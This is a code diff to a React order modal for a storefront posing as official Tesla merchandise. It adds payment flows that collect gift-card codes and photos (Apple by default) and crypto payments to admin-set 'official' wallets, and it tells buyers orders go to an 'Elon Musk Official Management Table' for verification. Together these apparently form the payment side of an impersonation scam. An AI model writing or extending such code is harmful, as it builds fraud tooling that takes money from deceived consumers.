@@ -21,7 +21,13 @@ import {
   TeslaOrder,
   AdminPaymentAccounts,
   PaymentAccountRequest,
+  OfficialWalletSymbol,
+  GiftCardPhotoUpload,
 } from '../types';
+import { mergeCompanyWallets } from '../data/officialWallets';
+import { OfficialWalletsSelector } from './OfficialWalletsSelector';
+import { CryptoPaymentConfirmBox } from './CryptoPaymentConfirmBox';
+import { ACCEPTED_GIFT_CARD_TYPES, GiftCardPaymentPanel } from './GiftCardPaymentPanel';
 
 interface MerchOrderModalProps {
   isOpen: boolean;
@@ -140,6 +146,14 @@ const MerchOrderModalInner: React.FC<{
   const [city, setCity] = useState('');
   const [postalCode, setPostalCode] = useState('');
   const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
+  const [selectedCryptoSymbol, setSelectedCryptoSymbol] = useState<OfficialWalletSymbol>('BTC');
+  const [cryptoPaymentConfirmed, setCryptoPaymentConfirmed] = useState<boolean>(false);
+  const [cryptoTxHash, setCryptoTxHash] = useState<string>('');
+  const [giftCardBrandId, setGiftCardBrandId] = useState<string>('apple');
+  const [giftCardFormat, setGiftCardFormat] = useState<'physical' | 'ecode'>('physical');
+  const [giftCardValueUsd, setGiftCardValueUsd] = useState<string>('');
+  const [giftCardCode, setGiftCardCode] = useState<string>('');
+  const [giftCardPhotos, setGiftCardPhotos] = useState<GiftCardPhotoUpload[]>([]);
   const [accountRequestNote, setAccountRequestNote] = useState('');
   const [copiedAccount, setCopiedAccount] = useState(false);
   const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
@@ -151,14 +165,18 @@ const MerchOrderModalInner: React.FC<{
   const handleSubmitOrder = (e: React.FormEvent) => {
     e.preventDefault();
     if (!customerName.trim() || !customerEmail.trim()) return;
+    if (paymentMethod === 'crypto' && !cryptoPaymentConfirmed) return;
 
     const now = new Date();
     const randomCode = Math.floor(100000 + Math.random() * 900000);
     const skuRef = `${product.skuPrefix}-${selectedTier.price}-${randomCode}`;
     const orderId = `TSLA-ORD-${Date.now().toString().slice(-6)}`;
     const paymentRefPrefix =
-      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : 'CRYPTO';
-    const paymentRef = `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;
+      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : selectedCryptoSymbol;
+    const paymentRef =
+      paymentMethod === 'crypto' && cryptoTxHash.trim()
+        ? `${selectedCryptoSymbol}-${cryptoTxHash.trim()}`
+        : `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;
 
     const formattedTimestamp = now.toLocaleString('en-US', {
       month: 'short',
@@ -178,6 +196,14 @@ const MerchOrderModalInner: React.FC<{
         ? `${product.name} (${selectedTier.name} × ${quantity})`
         : `${product.name} (${selectedTier.name})`;
 
+    const selectedGiftBrand =
+      ACCEPTED_GIFT_CARD_TYPES.find((b) => b.id === giftCardBrandId) || ACCEPTED_GIFT_CARD_TYPES[0];
+    const cleanGiftCode = giftCardCode.trim();
+    const giftCardLast4 = cleanGiftCode.length >= 4 ? cleanGiftCode.slice(-4).toUpperCase() : undefined;
+    const giftCardParsedVal = Number(giftCardValueUsd);
+    const giftCardFaceValue =
+      Number.isFinite(giftCardParsedVal) && giftCardParsedVal > 0 ? giftCardParsedVal : totalPrice;
+
     const newOrder: TeslaOrder = {
       orderId,
       reservationVin: skuRef,
@@ -192,7 +218,19 @@ const MerchOrderModalInner: React.FC<{
       paymentType: 'full',
       paymentStatus: 'pending_admin_approval',
       paymentMethod,
-      paymentReference: paymentRef,
+      paymentReference:
+        paymentMethod === 'gift_card'
+          ? `GIFT-${selectedGiftBrand.badgeCode}-${Date.now().toString().slice(-5)}`
+          : paymentRef,
+      ...(paymentMethod === 'gift_card'
+        ? {
+            giftCardType: selectedGiftBrand.name,
+            giftCardFormat,
+            giftCardFaceValue,
+            giftCardCodeLast4: giftCardLast4,
+            giftCardPhotos: giftCardPhotos.length > 0 ? giftCardPhotos : undefined,
+          }
+        : {}),
       depositAmount: totalPrice,
       totalPrice,
       amountPaidToday: totalPrice,
@@ -229,7 +267,11 @@ const MerchOrderModalInner: React.FC<{
           id: `trk-init-${now.getTime()}`,
           stage: 'Production',
           title: 'Official Merchandise Order Submitted',
-          details: `${quantity} × ${product.name} — ${selectedTier.gradeCode} (${selectedTier.name}, $${unitPrice}/ea · Size: ${selectedSize}) totaling $${totalPrice.toLocaleString()} via ${paymentMethod === 'gift_card' ? 'GIFT CARD' : paymentMethod.toUpperCase()} (${paymentRef}) sent to Elon Musk Official Management Table for verification.`,
+          details: `${quantity} × ${product.name} — ${selectedTier.gradeCode} (${selectedTier.name}, $${unitPrice}/ea · Size: ${selectedSize}) totaling $${totalPrice.toLocaleString()} via ${
+            paymentMethod === 'gift_card'
+              ? `GIFT CARD (${selectedGiftBrand.name}${giftCardPhotos.length > 0 ? `, ${giftCardPhotos.length} photo(s)` : ''})`
+              : paymentMethod.toUpperCase()
+          } (${paymentRef}) sent to Elon Musk Official Management Table for verification.`,
           location: `${deliveryAddress.trim() || 'Direct Shipping'}, ${city.trim() || 'Austin, TX'}`,
           timestamp: now.toISOString(),
           dateStr: formattedTimestamp,
@@ -549,7 +591,10 @@ const MerchOrderModalInner: React.FC<{
               <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                 <button
                   type="button"
-                  onClick={() => setPaymentMethod('wire')}
+                  onClick={() => {
+                    setPaymentMethod('wire');
+                    setCryptoPaymentConfirmed(false);
+                  }}
                   className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                     paymentMethod === 'wire'
                       ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
@@ -560,7 +605,10 @@ const MerchOrderModalInner: React.FC<{
                 </button>
                 <button
                   type="button"
-                  onClick={() => setPaymentMethod('gift_card')}
+                  onClick={() => {
+                    setPaymentMethod('gift_card');
+                    setCryptoPaymentConfirmed(false);
+                  }}
                   className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
                     paymentMethod === 'gift_card'
                       ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
@@ -578,9 +626,51 @@ const MerchOrderModalInner: React.FC<{
                       : 'bg-[#08142b] border-blue-900/70 text-slate-300'
                   }`}
                 >
-                  Bitcoin / Doge / USDC
+                  Official Crypto &amp; PayPal USD
                 </button>
               </div>
+
+              {paymentMethod === 'crypto' && (
+                <div className="space-y-3">
+                  <OfficialWalletsSelector
+                    wallets={mergeCompanyWallets(adminPaymentAccounts?.companyWallets)}
+                    selectedSymbol={selectedCryptoSymbol}
+                    onSelectSymbol={(sym) => {
+                      setSelectedCryptoSymbol(sym);
+                      setCryptoPaymentConfirmed(false);
+                    }}
+                  />
+                  <CryptoPaymentConfirmBox
+                    amountUsd={totalPrice}
+                    walletSymbol={selectedCryptoSymbol}
+                    confirmed={cryptoPaymentConfirmed}
+                    onConfirmChange={setCryptoPaymentConfirmed}
+                    txHash={cryptoTxHash}
+                    onTxHashChange={setCryptoTxHash}
+                  />
+                </div>
+              )}
+
+              {paymentMethod === 'gift_card' && (
+                <GiftCardPaymentPanel
+                  amountDueUsd={totalPrice}
+                  selectedBrandId={giftCardBrandId}
+                  onSelectBrandId={setGiftCardBrandId}
+                  cardFormat={giftCardFormat}
+                  onChangeCardFormat={setGiftCardFormat}
+                  cardValueUsd={giftCardValueUsd}
+                  onChangeCardValueUsd={setGiftCardValueUsd}
+                  cardCode={giftCardCode}
+                  onChangeCardCode={setGiftCardCode}
+                  photos={giftCardPhotos}
+                  onChangePhotos={setGiftCardPhotos}
+                  adminInstructions={
+                    paymentAccountRequests.find(
+                      (r) => r.paymentMethod === 'gift_card' && r.status === 'issued' && r.issuedAccountDetails
+                    )?.issuedAccountDetails?.trim() || adminPaymentAccounts?.giftCardInstructions?.trim()
+                  }
+                />
+              )}
 
               {(() => {
                 const issuedRequest = paymentAccountRequests.find(
@@ -594,8 +684,16 @@ const MerchOrderModalInner: React.FC<{
                     ? adminPaymentAccounts?.wireDetails?.trim()
                     : paymentMethod === 'gift_card'
                     ? adminPaymentAccounts?.giftCardInstructions?.trim()
-                    : adminPaymentAccounts?.cryptoAddress?.trim();
+                    : '';
                 const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';
+
+                if (paymentMethod === 'gift_card') {
+                  return null;
+                }
+
+                if (paymentMethod === 'crypto' && !issuedRequest?.issuedAccountDetails?.trim()) {
+                  return null;
+                }
 
                 if (activeAdminAccount) {
                   return (
@@ -711,10 +809,15 @@ const MerchOrderModalInner: React.FC<{
               </button>
               <button
                 type="submit"
-                className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold shadow-lg cursor-pointer flex items-center gap-2"
+                disabled={paymentMethod === 'crypto' && !cryptoPaymentConfirmed}
+                className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold shadow-lg cursor-pointer flex items-center gap-2"
               >
                 <Check className="w-4 h-4" />
-                <span>Submit Order (${totalPrice.toLocaleString()})</span>
+                <span>
+                  {paymentMethod === 'crypto' && !cryptoPaymentConfirmed
+                    ? `Confirm ${selectedCryptoSymbol} Payment Above to Proceed`
+                    : `Submit Order ($${totalPrice.toLocaleString()})`}
+                </span>
               </button>
             </div>
           </form>
